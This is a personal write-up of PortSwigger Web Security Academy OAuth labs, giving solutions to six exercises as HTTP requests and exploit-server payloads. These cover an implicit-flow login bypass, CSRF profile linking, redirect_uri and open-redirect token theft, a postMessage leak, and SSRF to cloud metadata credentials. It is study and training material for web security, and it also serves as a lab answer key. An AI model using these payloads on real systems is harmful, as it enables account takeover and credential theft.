---
description: https://portswigger.net/web-security/oauth
---

# OAuth 2.0 authentication vulnerabilities

### Lab: Authentication bypass via OAuth implicit flow

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net.

```
GET https://ac541fd41ec7d731c0806584006000b3.web-security-academy.net/
oauth-callback#access_token=-HREFB9WaEC0I5ql1EOA7eANdticm1myHd477RYKf6w&
expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1

GET /me HTTP/1.1
Host: oauth-acea1f801ee4d763c0da65c10266007d.web-security-academy.net
Authorization: Bearer -HREFB9WaEC0I5ql1EOA7eANdticm1myHd477RYKf6w

{"sub":"wiener","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}

POST /authenticate HTTP/1.1
...
{"email":"wiener@hotdog.com","username":"wiener","token":"tU-qmQ7s51oaWbQRBcFxAchRWD-Lznmrf-nav9vXxkE"}
```

**Solution:**

```
POST /authenticate HTTP/1.1
...
{"email":"carlos@carlos-montoya.net","username":"wiener","token":"tU-qmQ7s51oaWbQRBcFxAchRWD-Lznmrf-nav9vXxkE"}
```

### Lab: Forced OAuth profile linking

This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

Blog website account: wiener:peter Social media profile: peter.wiener:hotdog

Login blog -> Attach a social profile

`GET /auth?client_id=kc63uah4ebyokxf002r79& redirect_uri=https://ac5c1f6d1e62ae6ac042298200300071.web-security-academy.net/oauth-linking& response_type=code&scope=openid%20profile%20email HTTP/1.1`

There is no state parameter, so there is no csrf protection.

```
GET /oauth-linking?code=JSyPiTkLBFd7fwSGG_g-LQh6mePtbELznCsYZsGcIWr HTTP/1.1
```

We will do this again, then we will drop request at oauth-linking URL. So we will have an unused code.

```
GET /oauth-linking?code=PAX0Y9YNSpvpdBgZi8H9VOSf3UKGvYdT06sWfYSZaM9 HTTP/1.1
```

**Exploit Server ->**

```
Body:

    <iframe src="https://ac5c1f6d1e62ae6ac042298200300071.web-security-academy.net/oauth-linking?code=PAX0Y9YNSpvpdBgZi8H9VOSf3UKGvYdT06sWfYSZaM9"></iframe>
```

Admin user connected to specified social media account.

**Solution:**

My Account -> Login with social media.

### Lab: OAuth account hijacking via redirect\_uri

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

`GET /auth?client_id=z46bbl0uhkvp8yzl60o40& redirect_uri=https://ac3c1f071eb4fa24c0d411a200ca005a.web-security-academy.net/oauth-callback& response_type=code&scope=openid%20profile%20email`

We can inject our website to redirect\_uri parameter.

`GET /auth?client_id=z46bbl0uhkvp8yzl60o40& redirect_uri=https://kthve5dcbz1ssi1otvtokmpndej47t.burpcollaborator.net/oauth-callback& response_type=code&scope=openid%20profile%20email HTTP/1.1` **-> Follow redirection**

**Exploit Server -> Access log**

`"GET /oauth-callback?code=iQQm-py5v3SlopdJfogFZUW5AYFMmxdt2WdmPwSSbiQ HTTP/1.1" 200`

**Exploit Server ->**

```
Body:

<iframe src="https://oauth-acf31f551e55fa1dc07611920273008e.web-security-academy.net/auth?client_id=z46bbl0uhkvp8yzl60o40&redirect_uri=https://exploit-ac0c1f801ec6faddc061114901610055.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

**Exploit Server -> Access log**

`"GET /?code=HByGvnInermhlSEbNi33uV2QJMljAJoZUcc81-F7PGk HTTP/1.1"`

**Solution:**

```
https://ac3c1f071eb4fa24c0d411a200ca005a.web-security-academy.net/oauth-callback?code=HByGvnInermhlSEbNi33uV2QJMljAJoZUcc81-F7PGk
```

### Lab: Stealing OAuth access tokens via an open redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

`GET /auth?client_id=rjyfyzxtcqrgt1ucdr7qg&redirect_uri=https://acba1f891e46fa9cc0c8123200590055.web-security-academy.net/oauth-callback&response_type=token&nonce=-1763996802&scope=openid%20profile%20email`

I tried some ways on redirect\_uri. It is working only in the same domain. Directory escape works on it.

`GET /auth?client_id=rjyfyzxtcqrgt1ucdr7qg&redirect_uri=https://acba1f891e46fa9cc0c8123200590055.web-security-academy.net/oauth-callback/../post?postId=1&response_type=token&nonce=-1763996802&scope=openid%20profile%20email`

**Redirection ->** `GET /post?postId=1 HTTP/1.1`

And the access token parts of the url as fragment.

`/post?postId=1#access_token=uEZkAlYkgfxk9OU9n8Mo8xI7MbQb3IoRd2Ks5ZKAMvo&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email`

In the website, there is a next post option. There is an open redirect on it.

`GET /post/next?path=/post?postId=2 HTTP/1.1`

**Exploit Server ->**

```
Body:

<script>
  if (!document.location.hash) {
    window.location = 'https://oauth-ac741fa11eeafab0c02e12f8026c00fb.web-security-academy.net/auth?client_id=rjyfyzxtcqrgt1ucdr7qg&redirect_uri=https://acba1f891e46fa9cc0c8123200590055.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac5a1f0d1e28fa3bc00512b901b80067.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
  } else {
    window.location = '/?'+document.location.hash.substr(1)
  }
</script>
```

**Exploit Server -> Access log**

`"GET /?access_token=Am_o_8JiN3AuNX4ARCLl7FEOJEN-qi0HGwSJ1UxkEl-&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1"`

**Solution:**

```
GET /me HTTP/1.1
Host: oauth-ac741fa11eeafab0c02e12f8026c00fb.web-security-academy.net
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Authorization: Bearer Am_o_8JiN3AuNX4ARCLl7FEOJEN-qi0HGwSJ1UxkEl-

Response:

{"sub":"administrator","apikey":"464tt2959UoTEHpi9syf2A3ab25d1esC","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

### Lab: Stealing OAuth access tokens via a proxy page

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

There is directory traversal as last lab on redirect\_uri parameter.

`GET /auth?client_id=dkee764030032tgvfonrs&redirect_uri=https://ac041f581ee6ec0ac0ec123800d40062.web-security-academy.net/oauth-callback/../&response_type=token&nonce=-913949094&scope=openid%20profile%20email HTTP/1.1`

We found that request when we was discovering the website.

```
GET /post/comment/comment-form HTTP/1.1

In the response:
parent.postMessage({type: 'onload', data: window.location.href}, '*')
```

It allows messages to be posted to any origin (\*).

**Exploit Server ->**

```
Body:

<iframe src="https://oauth-ac9f1f471ecbec65c04b1288023000c6.web-security-academy.net/auth?client_id=dkee764030032tgvfonrs&redirect_uri=https://ac041f581ee6ec0ac0ec123800d40062.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
<script>
  window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data))
  }, false)
</script>
```

**Exploit Server -> Access log**

`"GET /https%3A%2F%2Fac041f581ee6ec0ac0ec123800d40062.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3D`**`TnYAMSv3j2tKOKHmug3PMQwx0G7FoQixp85yQDofVJ6`**`%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1`

**Solution:**

```
GET /me HTTP/1.1
Host: oauth-ac9f1f471ecbec65c04b1288023000c6.web-security-academy.net
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Authorization: Bearer TnYAMSv3j2tKOKHmug3PMQwx0G7FoQixp85yQDofVJ6

The response:
{"sub":"administrator","apikey":"7IqMPxwfliixOAy2k3kcCn1SCrIExo8E","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

### Lab: SSRF via OpenID dynamic client registration

This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.

`GET /auth?client_id=cecz0cs3w2afaspy8i061&redirect_uri=https://acfc1fba1ebcc6fec00a0dc400ef001f.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1`

```
https://oauth-ac651f251fccadfcc08a508702c20078.web-security-academy.net/.well-known/openid-configuration

In the page contents:
"registration_endpoint":"https://oauth-ac651f251fccadfcc08a508702c20078.web-security-academy.net/reg"
```

We will register our client application with the OAuth service.

```
POST /reg HTTP/1.1
Host: oauth-ac651f251fccadfcc08a508702c20078.web-security-academy.net
Content-Type: application/json

{
  "redirect_uris" : [
    "https://example.com"
  ],
  "logo_uri" : "https://h8q7wu7sh35k7ed3xkweig2mxd33rs.burpcollaborator.net"
}

In the response:
"client_id":"k6U7YzxGzpmI33Ubc7z6E"
```

```
GET /client/k6U7YzxGzpmI33Ubc7z6E/logo HTTP/1.1
Host: oauth-ac651f251fccadfcc08a508702c20078.web-security-academy.net

It fetches logo from our specified website.
```

**Solution:**

```
POST /reg HTTP/1.1
Host: oauth-ac651f251fccadfcc08a508702c20078.web-security-academy.net
Content-Type: application/json

{
  "redirect_uris" : [
    "https://example.com"
  ],
  "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

In the response:
"client_id":"x12A9q3sqVcNEwQ7TQuaB"

GET /client/x12A9q3sqVcNEwQ7TQuaB/logo HTTP/1.1
Host: oauth-ac651f251fccadfcc08a508702c20078.web-security-academy.net

The response:
{
  "Code" : "Success",
  "LastUpdated" : "2021-12-18T14:22:27.724842439Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "orMX9hDAB6unCoxG9fBd",
  "SecretAccessKey" : "uZzaO8a4sW0mUfaR8n9GcLId6bEGqnDsk7un2wJ8",
  "Token" : "JxHPZlH17cpU944ugg8G586rIGUenWd83m2BxmxhtzDqybbYFQTrKHpKF3jZpiTw6hJzdH27Ynczs4uGbKOBHeIN00FVXd1enfes3jSZeex2M3x0bYJJtiZknwv0Lnwd9oNXHWzN6qWgvptXzoMxgXFCOBHx31ggEwLG7AVANmp6DE6ddvmi3isFdaQwA4S5SlGyvqVhdfuH6BrxJ1ILtzHvVWZsGCkvHXC4HVDfzX1GSDwvQUkGPJXHYnMhiFEL",
  "Expiration" : "2027-12-17T14:22:27.724842439Z"
}
```
